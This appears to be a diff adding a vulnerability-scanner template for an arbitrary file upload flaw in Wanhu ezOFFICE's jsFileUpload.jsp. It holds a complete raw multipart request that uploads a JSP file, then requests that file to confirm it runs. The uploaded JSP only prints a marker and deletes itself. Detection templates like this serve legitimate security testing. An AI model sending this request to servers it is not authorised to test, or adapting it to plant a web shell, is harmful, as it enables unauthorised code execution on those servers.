@@ -1,0 +1,59 @@
+id: wanhu-ezoffice-jsFileUpload-fileupload
+info:
+  name: 万户 ezoffice jsFileUpload.jsp - fileupload
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - demo
+  metadata:
+    verified: false
+    max-request: 1
+    fofa-query: demo
+    hunter-query: demo
+    tips:
+    repair:
+    version:
+  tags: wanhu,oa,fileupload,ezoffice
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y/%M/%D")}}'
+
+http:
+  - raw:
+      - |
+        POST /defaultroot/work_flow/jsFileUpload.jsp?flag=1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 306
+        Cache-Control: max-age=0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydGdAZ2plNzduNYMp
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8
+        Cookie: %s
+
+        ------WebKitFormBoundarydGdAZ2plNzduNYMp
+        Content-Disposition: form-data; name="photo"; filename="{{filename}}.jsp"
+        Content-Type: application/octet-stream
+
+         <%out.print("{{randstr}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------WebKitFormBoundarydGdAZ2plNzduNYMp
+        Content-Disposition: form-data; name="submit"
+
+        sub
+        ------WebKitFormBoundarydGdAZ2plNzduNYMp--
+      
+      - |+
+        GET /defaultroot/devform/workflow/{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        
+    cookie-reuse: true
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - contains(body_2,'{{randstr}}')
+        condition: and
